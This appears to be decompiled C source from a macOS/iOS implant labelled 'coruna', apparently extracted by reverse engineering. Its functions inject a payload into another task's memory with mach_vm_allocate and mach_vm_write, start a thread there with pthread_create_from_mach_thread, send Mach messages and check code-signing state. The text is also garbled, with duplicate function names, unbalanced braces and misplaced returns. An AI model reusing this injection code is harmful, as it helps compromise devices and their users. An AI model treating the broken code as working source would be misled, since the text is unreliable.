    err = _pthread_mutex_init(arg,(pthread_mutexattr_t *)0x0);
    u = 0;
    if (err != 0) {
      u = 0xad00b;
    }
  }
  return u;
}





uint64_t coruna_loader_mutex_lock(long handle,pthread_mutex_t *arg)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if (((char)arg[1].__sig == '\0') || (arg[1].__opaque[0xc] != '\0')) {
        u = 0;
      }
      else if (*(long *)arg[1].__opaque == 0) {
        u = 0;
        arg[1].__opaque[0xc] = '\x01';
      }
      else {
        u = coruna_macho_get_slide(handle,*(uint32_t *)k_implant_mach_task_self_slot,
                             *(long *)arg[1].__opaque,*(uint32_t *)(arg[1].__opaque + 8));
      }
      _pthread_mutex_unlock(arg);
    }
    else {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_mach_port_deallocate(uint64_t *val)
{
  uint64_t u;
  
  if (val == (uint64_t *)0x0) {
    u = 0xad001;
  }
  else {
    u = coruna_loader_ctx_destroy(val[1]);
    if (1 < *(mach_port_name_t *)((long)val + 0x1c) + 1) {
      _mach_port_destroy(*(ipc_space_t *)k_implant_mach_task_self_slot,
                         *(mach_port_name_t *)((long)val + 0x1c));
    }
    if (1 < *(mach_port_name_t *)(val + 4) + 1) {
      _mach_port_deallocate(*(ipc_space_t *)(val + 2),*(mach_port_name_t *)(val + 4));
    }
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    val[3] = 0;
    val[2] = 0;
    _free(val);
  }
  return u;
}





unsigned long coruna_mach_port_deallocate(uint64_t *arg,long val,uint64_t n,long m,int p,
                  uint32_t q)

{
  uint u;
  uint size;
  long *entry_20;
  ipc_space_t task;
  unsigned long version;
  uint64_t cache_36;
  long region;
  uint32_t cache_47;
  unsigned long cache_37;
  
  version = 0xad001;
  if (((arg != (uint64_t *)0x0) && (val != 0)) && (m != 0)) {
    task = (ipc_space_t)n;
    if (task + 1 < 2) {
      version = 0x1e009;
    }
    else {
      if (p + 1U < 2) {
        cache_37 = cache_37 & 0xffffffffffffff00;
        size = coruna_csops(&cache_37);
        if (size != 0) {
          u = 0x1e037;
          if (size != 0x12017) {
            u = size;
          }
          return (unsigned long)u;
        }
        if ((char)cache_37 != '\0') {
          return 0x1e037;
        }
      }
      entry_20 = _calloc(1,0x28);
      if (entry_20 == (long *)0x0) {
        version = 0xad009;
      }
      else {
        cache_36 = 0;
        version = coruna_mach_port_destroy((long)&cache_36 + 4,n,&cache_36);
        if ((int)version == 0) {
          cache_37 = 0;
          cache_47 = 0;
          version = (**(void (**)(m + 0x18))(m,0xf0000,&cache_37,&cache_47);
          if ((int)version == 0) {
            region = 0;
            version = coruna_implant_via_ctx_free(val,n,cache_37,cache_47,0,&region);
            if ((int)version == 0) {
              *entry_20 = m;
              entry_20[1] = region;
              *(mach_port_name_t *)((long)entry_20 + 0x1c) = cache_36;
              *(mach_port_name_t *)(entry_20 + 4) = (mach_port_name_t)cache_36;
              *(ipc_space_t *)(entry_20 + 2) = task;
              *(int *)((long)entry_20 + 0x14) = p;
              *(uint32_t *)(entry_20 + 3) = q;
              *arg = entry_20;
              return version;
            }
          }
          _mach_port_deallocate(task,(mach_port_name_t)cache_36);
          if (1 < cache_36 + 1) {
            _mach_port_destroy(*(ipc_space_t *)k_implant_mach_task_self_slot,cache_36);
          }
        }
        _free(entry_20);
      }
    }
  }
  return version;
}





uint8_t *
uint64_t * coruna_run_end_last(int64_t *arg,void* arg_x,uint size,uint64_t val,char *path,void* arg, uint flags_2,uint32_t *size_x)
{
  uint u;
  uint32_t size;
  uint8_t *ptr;
  int err;
  uint version;
  int status;
  kern_return_t lk7;
  uint8_t *buf;
  long handle;
  uint64_t *data;
  void *ptr;
  size_t ls11;
  unsigned long port;
  uint64_t tag;
  unsigned long kind;
  unsigned long type_id;
  long *buf;
  long scratch;
  mach_vm_address_t bootargs;
  uint32_t thread_attr;
  mach_vm_address_t host_info;
  mach_vm_address_t serial_buf;
  uint action;
  void *block_ctx;
  uint stack_guard;
  void *sa_saved;
  long sa_new;
  long path_buf;
  pthread_attr_t tmp_buf;
  long region;
  
  region = *(long *)k_implant_stack_chk_guard_slot;
  if (((((arg == (long *)0x0) || (arg_x == (void *)0x0)) || (size == 0)) ||
      ((path == (char *)0x0 || (*path == '\0')))) ||
     ((arg == (void *)0x0) == (flags_2 != 0))) {
    buf = (uint8_t *)0xad001;
    if (*(long *)k_implant_stack_chk_guard_slot == region) {
    return buf;
    }
    ___stack_chk_fail();
  }
  thread_attr = 0;
  port = val >> 3 & 1;
  if (k_implant_rodata_word_26aa0 <= *(double *)k_implant_dyldversionnumber_slot) {
    port = val >> 3 & 1 | 2;
  }
  err = coruna_set_priority((int)arg[2],0xffffffec,&thread_attr);
  buf = (uint8_t *)coruna_port_kernel_object((int)arg[2]);
  if (((int)buf == 0) && (buf = (uint8_t *)coruna_task_exc_guard((int)arg[2]), (int)buf == 0))
  {
    sa_new = 0;
    path_buf = 0;
    version = coruna_lookup_export(arg[1],"_last",&path_buf);
    if (version == 0) {
      version = coruna_lookup_export(arg[1],"_end",&sa_new);
    }
    if (((version == 0) && (path_buf != 0)) && (sa_new != 0)) {
      handle = arg[1];
      if (handle == 0) {
        buf = (uint8_t *)0xad001;
      }
      else {
        tag = *(uint64_t *)(handle + 0x40);
        size = *(uint32_t *)(handle + 0x48);
        sa_saved = (void *)0x0;
        stack_guard = 0;
        tmp_buf.__sig = 0;
        block_ctx = (void *)((unsigned long)block_ctx & 0xffffffff00000000);
        buf = (uint8_t *)coruna_export_name_table(handle,&tmp_buf,&block_ctx);
        if ((int)buf == 0) {
          handle = arg[1];
          buf = (uint8_t *)0xad001;
          if (handle != 0) {
            buf = (uint8_t *)
                     coruna_fixup_apply(*(uint64_t *)(handle + 0x40),*(uint32_t *)(handle + 0x48),
                                  tmp_buf.__sig,(unsigned long)block_ctx & 0xffffffff,
                                  *(uint64_t *)(handle + 0xd8),*(uint32_t *)(handle + 0xe0),
                                  *(uint64_t *)(handle + 200),*(uint32_t *)(handle + 0xd0),
                                  *(uint64_t *)(handle + 0x140),&sa_saved,&stack_guard);
          }
          if ((void *)tmp_buf.__sig != (void *)0x0) {
            _free((void *)tmp_buf.__sig);
          }
          if ((int)buf == 0) {
            block_ctx = (void *)0x0;
            action = 0;
            buf = (uint8_t *)(**(void (**)(*arg + 0x20))(*arg,&block_ctx,&action);
            version = action;
            if ((int)buf == 0) {
              kind = (unsigned long)stack_guard;
              u = stack_guard + action + 0x90;
              type_id = (unsigned long)u;
              data = _calloc(1,type_id);
              if (data == (uint64_t *)0x0) {
                scratch = 0;
                bootargs = 0;
                u = 0;
                buf = (uint8_t *)0xad009;
              }
              else {
                host_info = 0;
                serial_buf = 0;
                _memcpy(data + 0x12,sa_saved,kind);
                _memcpy((void *)((long)data + (unsigned long)(stack_guard + 0x90)),block_ctx,(unsigned long)action);
                *data = tag;
                *(uint32_t *)(data + 1) = size;
                data[2] = 0;
                *(uint *)(data + 3) = u;
                data[4] = tag;
                *(uint32_t *)(data + 5) = size;
                *(uint32_t *)(data + 6) = 0x90;
                *(uint *)((long)data + 0x34) = stack_guard;
                handle = arg[4];
                data[8] = sa_new;
                *(uint *)(data + 9) = stack_guard + 0x90;
                *(uint *)((long)data + 0x4c) = action;
                *(int *)(data + 10) = (int)handle;
                data[0xb] = port;
                handle = _dlsym(0xfffffffffffffffe,"pthread_create_from_mach_thread");
                buf = data + 0xc;
                *buf = handle;
                if (handle == 0) {
                  buf = &k_implant_rodata_word_12001;
done:
                  if (data[2] != 0) {
                    coruna_mach_vm_deallocate((int)arg[2],serial_buf,type_id,1);
                  }
                  if (*buf != 0) {
                    coruna_mach_vm_deallocate((int)arg[2],host_info,0x38,1);
                  }
                  scratch = 0;
                  bootargs = 0;
                  u = 0;
                }
                else {
                  buf = (uint8_t *)coruna_bind_dlopen_table(arg[1],buf);
                  if (((int)buf != 0) ||
                     (buf = (uint8_t *)coruna_mach_vm_allocate((int)arg[2],0x38,1,&host_info),
                     (int)buf != 0)) goto done;
                  tmp_buf.__opaque[0x20] = '\0';
                  tmp_buf.__opaque[0x21] = '\0';
                  tmp_buf.__opaque[0x22] = '\0';
                  tmp_buf.__opaque[0x23] = '\0';
                  tmp_buf.__opaque[0x24] = '\0';
                  tmp_buf.__opaque[0x25] = '\0';
                  tmp_buf.__opaque[0x26] = '\0';
                  tmp_buf.__opaque[0x27] = '\0';
                  tmp_buf.__opaque[0x18] = '\0';
                  tmp_buf.__opaque[0x19] = '\0';
                  tmp_buf.__opaque[0x1a] = '\0';
                  tmp_buf.__opaque[0x1b] = '\0';
                  tmp_buf.__opaque[0x1c] = '\0';
                  tmp_buf.__opaque[0x1d] = '\0';
                  tmp_buf.__opaque[0x1e] = '\0';
                  tmp_buf.__opaque[0x1f] = '\0';
                  tmp_buf.__opaque[0x30] = '\0';
                  tmp_buf.__opaque[0x31] = '\0';
                  tmp_buf.__opaque[0x32] = '\0';
                  tmp_buf.__opaque[0x33] = '\0';
                  tmp_buf.__opaque[0x34] = '\0';
                  tmp_buf.__opaque[0x35] = '\0';
                  tmp_buf.__opaque[0x36] = '\0';
                  tmp_buf.__opaque[0x37] = '\0';
                  tmp_buf.__opaque[0x28] = '\0';
                  tmp_buf.__opaque[0x29] = '\0';
                  tmp_buf.__opaque[0x2a] = '\0';
                  tmp_buf.__opaque[0x2b] = '\0';
                  tmp_buf.__opaque[0x2c] = '\0';
                  tmp_buf.__opaque[0x2d] = '\0';
                  tmp_buf.__opaque[0x2e] = '\0';
                  tmp_buf.__opaque[0x2f] = '\0';
                  tmp_buf.__opaque[0] = '\0';
                  tmp_buf.__opaque[1] = '\0';
                  tmp_buf.__opaque[2] = '\0';
                  tmp_buf.__opaque[3] = '\0';
                  tmp_buf.__opaque[4] = '\0';
                  tmp_buf.__opaque[5] = '\0';
                  tmp_buf.__opaque[6] = '\0';
                  tmp_buf.__opaque[7] = '\0';
                  tmp_buf.__sig = 0;
                  tmp_buf.__opaque[0x10] = '\0';
                  tmp_buf.__opaque[0x11] = '\0';
                  tmp_buf.__opaque[0x12] = '\0';
                  tmp_buf.__opaque[0x13] = '\0';
                  tmp_buf.__opaque[0x14] = '\0';
                  tmp_buf.__opaque[0x15] = '\0';
                  tmp_buf.__opaque[0x16] = '\0';
                  tmp_buf.__opaque[0x17] = '\0';
                  tmp_buf.__opaque[8] = '\0';
                  tmp_buf.__opaque[9] = '\0';
                  tmp_buf.__opaque[10] = '\0';
                  tmp_buf.__opaque[0xb] = '\0';
                  tmp_buf.__opaque[0xc] = '\0';
                  tmp_buf.__opaque[0xd] = '\0';
                  tmp_buf.__opaque[0xe] = '\0';
                  tmp_buf.__opaque[0xf] = '\0';
                  _pthread_attr_init(&tmp_buf);
                  status = _pthread_attr_setdetachstate(&tmp_buf,2);
                  if ((status != 0) ||
                     (lk7 = _mach_vm_write(*(vm_map_t *)(arg + 2),host_info,
                                             (vm_offset_t)&tmp_buf,0x38), lk7 != 0)) {
                    _pthread_attr_destroy(&tmp_buf);
                    buf = (uint8_t *)0xad00b;
                    goto done;
                  }
                  data[0xe] = host_info;
                  *(uint32_t *)(data + 0xf) = 0x38;
                  _pthread_attr_destroy(&tmp_buf);
                  buf = (uint8_t *)coruna_mach_vm_allocate((int)arg[2],type_id,0x3000001,&serial_buf);
                  if ((int)buf != 0) goto done;
                  data[2] = serial_buf;
                  lk7 = _mach_vm_write(*(vm_map_t *)(arg + 2),serial_buf,(vm_offset_t)data,u
                                        );
                  if (lk7 != 0) {
                    buf = (uint8_t *)0x1e01a;
                    goto done;
                  }
                  buf = (uint8_t *)0x0;
                  bootargs = serial_buf;
                  scratch = path_buf;
                }
                _bzero(data,type_id);
                _free(data);
                version = action;
              }
              _bzero(block_ctx,(unsigned long)version);
              _free(block_ctx);
            }
            else {
              scratch = 0;
              bootargs = 0;
              u = 0;
            }
            _bzero(sa_saved,(unsigned long)stack_guard);
            _free(sa_saved);
            if ((int)buf == 0) {
              buf = (uint8_t *)
                       coruna_remote_memcpy(arg[1],scratch,bootargs,u,(int)arg[4]);
              if ((int)buf == 0) {
                if (arg[1] != 0) {
                  *(uint8_t *)(arg[1] + 0xfb) = 0;
                }
                *(uint32_t *)(arg + 4) = 0;
                buf = (uint8_t *)coruna_mach_port_deallocate(arg,&k_implant_slot_4e20,3,0);
                if ((int)buf == 0) {
                  tmp_buf.__sig = tmp_buf.__sig & 0xffffffff00000000;
                  buf = (uint8_t *)coruna_mach_port_deallocate(arg,&k_implant_slot_7530,8,&tmp_buf);
                  if ((int)buf == 0) {
                    port = (unsigned long)(size + 0x43 & 0xfffffffc);
                    ptr = _calloc(1,port);
                    if (ptr == (void *)0x0) {
                      buf = (uint8_t *)0xad009;
                    }
                    else {
                      *(uint64_t *)((long)ptr + 0x14) = 0x100000001;
                      status = *(int *)((long)arg + 0x14);
                      if (1 < status + 1U) {
                        *(uint32_t *)((long)ptr + 0x24) = 0x130000;
                        *(int *)((long)ptr + 0x1c) = status;
                      }
                      *(int *)((long)ptr + 0x38) = (int)arg[3];
                      *(uint *)((long)ptr + 0x3c) = size;
                      *(unsigned long *)((long)ptr + 0x30) = val;
                      _memcpy((void *)((long)ptr + 0x40),arg_x,(unsigned long)size);
                      buf = (uint8_t *)
                               coruna_mach_msg_send(tmp_buf.__sig & 0xffffffff,ptr,port,&k_implant_slot_7530
                                            ,1);
                      _bzero(ptr,port);
                      _free(ptr);
                    }
                    ptr = k_implant_mach_task_self_slot;
                    _mach_port_deallocate
                              (*(ipc_space_t *)k_implant_mach_task_self_slot,
                               (mach_port_name_t)tmp_buf.__sig);
                    if (((int)buf == 0) &&
                       ((flags_2 == 0 || (buf = (uint8_t *)0xad001, arg != (void *)0x0))))
                    {
                      ls11 = _strlen(path);
                      if (ls11 - 1 < 0x3fe) {
                        tmp_buf.__sig = tmp_buf.__sig & 0xffffffff00000000;
                        buf = (uint8_t *)coruna_mach_port_deallocate(arg,&k_implant_slot_7530,9,&tmp_buf);
                        if ((int)buf == 0) {
                          port = (unsigned long)(flags_2 + (int)ls11 + 0x24 & 0xfffffffc);
                          ptr = _calloc(1,port);
                          if (ptr == (void *)0x0) {
                            buf = (uint8_t *)0xad009;
                          }
                          else {
                            *(uint32_t *)((long)ptr + 0x14) = 2;
                            *(int *)((long)ptr + 0x18) = (int)(ls11 + 1);
                            *(uint *)((long)ptr + 0x1c) = flags_2;
                            _memcpy((void *)((long)ptr + 0x20),path,ls11 + 1);
                            if (flags_2 != 0) {
                              _memcpy((void *)((long)ptr + ls11 + 0x21),arg,(unsigned long)flags_2
                                     );
                            }
                            buf = (uint8_t *)
                                     coruna_mach_msg_send(tmp_buf.__sig & 0xffffffff,ptr,port,
                                                  &k_implant_slot_7530,0);
                            _bzero(ptr,port);
                            _free(ptr);
                          }
                          _mach_port_deallocate
                                    (*(ipc_space_t *)ptr,(mach_port_name_t)tmp_buf.__sig);
                          if (((int)buf == 0) &&
                             (buf = (uint8_t *)coruna_mach_port_deallocate(arg,&k_implant_slot_4e20,10,0),
                             (int)buf == 0)) {
                            if (size_x == (uint32_t *)0x0) {
                              _mach_port_mod_refs(*(ipc_space_t *)ptr,
                                                  *(mach_port_name_t *)((long)arg + 0x1c),1,-1);
                            }
                            else {
                              *size_x = *(uint32_t *)((long)arg + 0x1c);
                            }
                            buf = (uint8_t *)0x0;
                            *(uint32_t *)((long)arg + 0x1c) = 0;
                          }
                        }
                      }
                      else {
                        buf = (uint8_t *)0x1e010;
                      }
                    }
                  }
                }
              }
              else {
                coruna_mach_vm_deallocate((int)arg[2],bootargs,u,1);
              }
            }
          }
        }
      }
    }
    else {
      u = 0x12001;
      if (version != 0) {
        u = version;
      }
      buf = (uint8_t *)(unsigned long)u;
    }
  }
  if (err == 0) {
    coruna_set_priority((int)arg[2],thread_attr,0);
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == region) {
    return buf;
  }
  ___stack_chk_fail();
}





uint coruna_set_priority(mach_port_name_t arg,int flags,int *count_2)
{
  uint u;
  int err;
  int status;
  int *err;
  uint *ptr;
  id_t scratch;
  
  scratch = 0xffffffff;
  u = 0xad001;
  if (((1 < arg + 1) && (-0x15 < flags)) && (flags < 0x15)) {
    u = _pid_for_task(arg,(int *)&scratch);
    if (u == 0) {
      err = ___error();
      *err = 0;
      err = _getpriority(0,scratch);
      err = ___error();
      if (((*err == 0) || (err != -1)) &&
         (status = _setpriority(0,scratch,flags), status == 0)) {
        u = 0;
        if (count_2 != (int *)0x0) {
          *count_2 = err;
        }
      }
      else {
        err = ___error();
        err = *err;
        ptr = (uint *)___error();
        u = -*ptr;
        if (-1 < err) {
          u = *ptr;
        }
        u = u | 0x40000000;
      }
    }
    else {
      u = u | 0x80000000;
    }
  }
  return u;
}





unsigned long coruna_mach_port_deallocate(long arg,uint64_t val,int n,mach_port_name_t *m)

{
  uint u;
  mach_port_name_t *lpm2;
  unsigned long type_id;
  mach_port_name_t cache_44;
  uint64_t cache_45;
  
  if (arg == 0) {
    type_id = 0xad001;
  }
  else {
    cache_45 = 0;
    cache_44 = 0;
    lpm2 = (mach_port_name_t *)0x0;
    if (m != (mach_port_name_t *)0x0) {
      lpm2 = &cache_44;
    }
    type_id = coruna_mach_port_deallocate(*(uint32_t *)(arg + 0x1c),val,(long)&cache_45 + 4,&cache_45,
                         lpm2);
    if ((int)type_id == 0) {
      type_id = cache_45 & 0xffffffff;
      if ((int)cache_45 == 0) {
        u = 0x1e040;
        if (cache_45 == n) {
          u = 0;
        }
        type_id = (unsigned long)u;
        if ((cache_45 == n) && (m != (mach_port_name_t *)0x0)) {
          type_id = 0x1e036;
          if (1 < cache_44 + 1) {
            type_id = 0;
            *m = cache_44;
            cache_44 = 0;
          }
        }
      }
      if (1 < cache_44 + 1) {
        _mach_port_deallocate(*(ipc_space_t *)k_implant_mach_task_self_slot,cache_44);
      }
    }
  }
  return type_id;
}





uint64_t
uint64_t coruna_mach_port_deallocate(uint64_t val,uint64_t id_2,uint32_t *size,uint32_t *flags_2, uint32_t *version_3)
{
  void *ptr;
  uint64_t u;
  
  if ((int)val + 1U < 2) {
    u = 0x1e01b;
  }
  else {
    ptr = _calloc(1,0x28);
    if (ptr == (void *)0x0) {
      u = 0xad009;
    }
    else {
      u = coruna_mach_msg_recv(val,5,0x28,ptr,id_2);
      if ((int)u == 0) {
        if (*(int *)((long)ptr + 0x14) == 5) {
          u = 0x1e038;
          if (*(int *)((long)ptr + 4) == 0x20) {
            if (size != (uint32_t *)0x0) {
              *size = *(uint32_t *)((long)ptr + 0x18);
            }
            if (flags_2 != (uint32_t *)0x0) {
              *flags_2 = *(uint32_t *)((long)ptr + 0x1c);
            }
            u = 0;
            if (version_3 != (uint32_t *)0x0) {
              *version_3 = *(uint32_t *)((long)ptr + 8);
              *(uint32_t *)((long)ptr + 8) = 0;
            }
          }
        }
        else {
          u = 0x1e038;
        }
      }
      if (1 < *(mach_port_name_t *)((long)ptr + 8) + 1) {
        _mach_port_deallocate
                  (*(ipc_space_t *)k_implant_mach_task_self_slot,
                   *(mach_port_name_t *)((long)ptr + 8));
      }
      _free(ptr);
    }
  }
  return u;
}





uint64_t coruna_mach_port_destroy(mach_port_name_t *arg,uint64_t val,long handle)
{
  uint64_t u;
  mach_port_name_t scratch;
  
  u = 0xad001;
  if ((arg != (mach_port_name_t *)0x0) && (handle != 0)) {
    if ((int)val + 1U < 2) {
      u = 0x1e009;
    }
    else {
      scratch = 0;
      u = coruna_mach_port_allocate(&scratch,5);
      if ((int)u == 0) {
        u = coruna_mach_port_insert_right(scratch,val,handle);
        if ((int)u == 0) {
          *arg = scratch;
        }
        else if (1 < scratch + 1) {
          _mach_port_destroy(*(ipc_space_t *)k_implant_mach_task_self_slot,scratch);
        }
      }
    }
  }
  return u;
}
unsigned long coruna_realpath(uint64_t arg,uint64_t val,uint32_t *n)

{
  uint u;
  uint64_t size;
  bool i;
  int j;
  char *str;
  char *obj;
  size_t ls7;
  void *entry_21;
  unsigned long kind;
  char *entry_11;
  unsigned long type_id_16;
  void *entry_22;
  unsigned long type_id_9;
  uint8_t kind[16];
  uint8_t *cache_63;
  uint64_t cache_64;
  void (*cache_65)(void);
  uint8_t *cache_66;
  uint64_t *cache_67;
  uint64_t *cache_68;
  uint64_t *cache_69;
  char *cache_70;
  byte cache_71;
  byte cache_72;
  byte cache_73;
  uint64_t cache_74;
  uint64_t *cache_75;
  uint64_t cache_76;
  uint32_t cache_77;
  uint64_t cache_78;
  uint64_t *cache_79;
  uint64_t cache_80;
  uint32_t cache_81;
  uint64_t cache_82;
  uint64_t *cache_83;
  uint64_t cache_84;
  uint64_t cache_85;
  uint64_t cache;
  uint8_t *cache_86;
  uint64_t cache_87;
  void (*cache_88)(void);
  uint8_t *cache_89;
  uint8_t **cache_90;
  uint8_t *cache_91;
  size_t cache_92;
  uint8_t cache_93[4096];
  uint64_t cache_34;
  uint64_t block_ctx;
  long region;
  
  kind = (*(void (*)k_implant_chkstk_darwin_slot)();
  str = kind;
  region = *(long *)k_implant_stack_chk_guard_slot;
  if ((str == (char *)0x0) || (*str == '\0' || n == (uint32_t *)0x0)) {
    u = 0xad001;
    if (n != (uint32_t *)0x0) {
      u = 0x1e03f;
    }
    type_id_16 = (unsigned long)u;
    if (*(long *)k_implant_stack_chk_guard_slot == region) {
    return type_id_16;
    }
    ___stack_chk_fail();
  }
  if ((kind & 1) == 0) {
    obj = _strrchr(str,0x2f);
    if (obj != (char *)0x0) {
      str = obj + 1;
    }
    if (*str == '\0') {
load_ok_59:
      type_id_16 = 0x1e03f;
      if (*(long *)k_implant_stack_chk_guard_slot == region) {
      return type_id_16;
      }
      ___stack_chk_fail();
    }
    entry_11 = (char *)0x0;
    obj = str;
  }
  else {
    entry_11 = (char *)_realpath_DARWIN_EXTSN(str,0);
    obj = entry_11;
    if (entry_11 == (char *)0x0) {
      if (*str == '\0') goto load_ok_59;
      entry_11 = (char *)0x0;
      obj = str;
    }
  }
  size = k_implant_rodata_word_26a70;
  cache_71 = ~kind[8] & 1;
  cache_68 = &cache_82;
  cache_82 = 0;
  u = kind & 0xff;
  cache_84 = k_implant_rodata_word_26aa8;
  cache_73 = ((byte)(u >> 2) ^ 0xff) & 1;
  cache_72 = ((byte)(u >> 1) ^ 0xff) & 1;
  cache_85 = 0;
  cache = 0;
  cache_69 = &cache_78;
  cache_78 = 0;
  cache_80 = k_implant_rodata_word_26a68;
  cache_81 = 0;
  cache_67 = &cache_74;
  cache_74 = 0;
  cache_76 = k_implant_rodata_word_26a68;
  cache_77 = 0;
  cache_63 = k_implant_nsconcretestackblock_slot;
  cache_64 = k_implant_rodata_word_26a70;
  cache_65 = coruna_strrchr;
  cache_66 = &k_implant_rodata_word_28ab8;
  cache_70 = obj;
  cache_75 = cache_67;
  cache_79 = cache_69;
  cache_83 = cache_68;
  _bzero(cache_93,0x1000);
  cache_86 = k_implant_nsconcretestackblock_slot;
  cache_87 = size;
  cache_88 = coruna_proc_pidpath;
  cache_89 = &k_implant_rodata_word_28ae8;
  block_ctx = k_implant_rodata_word_00026ab8;
  cache_34 = k_implant_rodata_word_26ab0;
  cache_92 = 0;
  cache_90 = &cache_63;
  cache_91 = cache_93;
  j = _sysctl((int *)&cache_34,4,(void *)0x0,&cache_92,(void *)0x0,0);
  if ((j == 0) && (cache_92 != 0)) {
    cache_92 = cache_92 << 1;
    entry_21 = _malloc(cache_92);
    type_id_16 = 0xad00b;
    }
    __Block_object_dispose(&cache_74,8);
    __Block_object_dispose(&cache_78,8);
    __Block_object_dispose(&cache_82,8);
    if (entry_11 != (char *)0x0) {
    ls7 = _strlen(entry_11);
    if (ls7 != 0) {
    _bzero(entry_11,ls7);
    }
    _free(entry_11);
    }
    load_ok_58:
    if (*(long *)k_implant_stack_chk_guard_slot == region) {
    return type_id_16;
  }
  else {
load_ok_60:
    type_id_16 = 0xad00b;
  }
  __Block_object_dispose(&cache_74,8);
  __Block_object_dispose(&cache_78,8);
  __Block_object_dispose(&cache_82,8);
  if (entry_11 != (char *)0x0) {
    ls7 = _strlen(entry_11);
    if (ls7 != 0) {
      _bzero(entry_11,ls7);
    }
    _free(entry_11);
  }
load_ok_58:
  if (*(long *)k_implant_stack_chk_guard_slot == region) {
    return type_id_16;
  }
  ___stack_chk_fail();
}





uint64_t coruna_strrchr(long handle,long *addr_2,char *path)
{
  int err;
  char *ptr;
  long handle;
  long addr;
  long off;
  
  if (*(char *)(handle + 0x40) != '\0') {
    if (path == (char *)0x0) {
      return 0;
    }
    ptr = _strrchr(path,0x2f);
    if (ptr != (char *)0x0) {
      path = ptr + 1;
    }
  }
  if (path == (char *)0x0) {
    return 0;
  }
  if (addr_2 == (long *)0x0) {
    return 0;
  }
  err = _strcmp(*(char **)(handle + 0x38),path);
  if ((err == 0) && (0 < (int)addr_2[5])) {
    handle = *(long *)(*(long *)(handle + 0x20) + 8);
    *(int *)(handle + 0x18) = *(int *)(handle + 0x18) + 1;
    if ((1 < *(uint *)(*(long *)(*(long *)(handle + 0x20) + 8) + 0x18)) &&
       (*(char *)(handle + 0x41) == '\0')) {
      return 0x1e03e;
    }
    if (*(char *)(handle + 0x42) == '\0') {
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      off = *(long *)(handle + 0x18);
      if ((off == 0) && (*(int *)(handle + 0x20) == 0)) {
        addr = *addr_2;
      }
      else {
        addr = *addr_2;
        if (off <= addr) {
          if (addr != off) {
            return 0;
          }
          addr = off;
          if (*(int *)(handle + 0x20) <= (int)addr_2[1]) {
            return 0;
          }
        }
      }
    }
    else {
      addr = *addr_2;
      handle = *(long *)(*(long *)(handle + 0x28) + 8);
      if (addr <= *(long *)(handle + 0x18)) {
        if (addr != *(long *)(handle + 0x18)) {
          return 0;
        }
        if ((int)addr_2[1] <= *(int *)(handle + 0x20)) {
          return 0;
        }
      }
    }
    *(long *)(handle + 0x18) = addr;
    *(int *)(*(long *)(*(long *)(handle + 0x28) + 8) + 0x20) = (int)addr_2[1];
    *(int *)(*(long *)(*(long *)(handle + 0x30) + 8) + 0x18) = (int)addr_2[5];
    return 0;
  }
  return 0;
}





uint64_t coruna_proc_pidpath(long handle,long addr_2)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  uint64_t *ptr;
  unsigned long unaff_x30;
  uint64_t size;
  
  if (0 < *(int *)(addr_2 + 0x28)) {
    err = _proc_pidpath(*(int *)(addr_2 + 0x28),*(void **)(handle + 0x28),0x1000);
    if (0 < err) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      u = (**(void (**)(*(long *)(handle + 0x20) + 0x10))
                        (*(long *)(handle + 0x20),addr_2,*(uint64_t *)(handle + 0x28));
      return u;
    }
    ptr = *(uint64_t **)(handle + 0x28);
    size = *(uint64_t *)(addr_2 + 0xfb);
    u = *(uint64_t *)(addr_2 + 0xf3);
    *(uint8_t *)(ptr + 2) = *(uint8_t *)(addr_2 + 0x103);
    ptr[1] = size;
    *ptr = u;
    *(uint8_t *)(*(long *)(handle + 0x28) + 0x11) = 0;
  }
  return 0;
}





int coruna_ctx_free(uint64_t *val)
{
  int err;
  int status;
  void *ptr;
  
  if (val == (uint64_t *)0x0) {
    err = 0xad001;
  }
  else {
    ptr = (void *)val[6];
    if (ptr != (void *)0x0) {
      coruna_objc_msgsend(ptr);
      _free(ptr);
    }
    err = coruna_rwlock_iface_destroy(val[5]);
    status = coruna_mach_port_deallocate(val[3]);
    if (err != 0) {
      status = err;
    }
    err = status;
    if ((*(char *)(val + 1) != '\0') && (err = coruna_ctx_free(*val), status != 0)) {
      err = status;
    }
    val[6] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
  }
  return err;
}





unsigned long coruna_csops(uint64_t *arg,short *val,long n,short *m)

{
  uint u;
  pid_t lp2;
  int flags;
  unsigned long version;
  int *idx;
  uint *str;
  long *entry_23;
  uint64_t *data;
  int n;
  unsigned long cache_36;
  uint32_t region;
  uint8_t cache_33[4];
  int *plist;
  uint64_t scratch;
  uint32_t url_buf;
  long cache_39;
  
  cache_39 = *(long *)k_implant_stack_chk_guard_slot;
  region = 0;
  cache_36 = 0;
  version = coruna_parse_xnu_version(&cache_36);
  if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
  return version;
  }
  ___stack_chk_fail();
  _getpid();
  plist = (int *)0x0;
  scratch = 0;
  url_buf = 0;
  if (k_implant_rodata_word_26a58 <= *(double *)k_implant_dyldversionnumber_slot) {
    lp2 = _getpid();
    flags = _csops(lp2,0,cache_33,4);
    if (-1 < flags) goto load_ok_62;
  }
  else {
    lp2 = _getpid();
    flags = _csops(lp2,5,&plist,0x14);
    if ((-1 < flags) || (idx = ___error(), *idx == 0x55)) {
load_ok_62:
      version = 0xad001;
      if ((arg == (uint64_t *)0x0) ||
         if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
         return version;
         }
         ___stack_chk_fail();
      plist = (int *)0x0;
      cache_36 = cache_36 & 0xffffffff00000000;
      flags = (**(void (**)(val + 0xc))(val,0xf0000,&plist,&cache_36);
      if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
      return version;
      }
      ___stack_chk_fail();
      flags = *plist;
      if (flags < -0x30051202) {
        if ((flags != -0x41450136) && (flags != -0x35014542)) {
          n = -0x31051202;
load_ok_63:
          if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
          return version;
          }
          ___stack_chk_fail();
        }
      }
      else if (1 < flags + 0x1120532U) {
        n = -0x30051202;
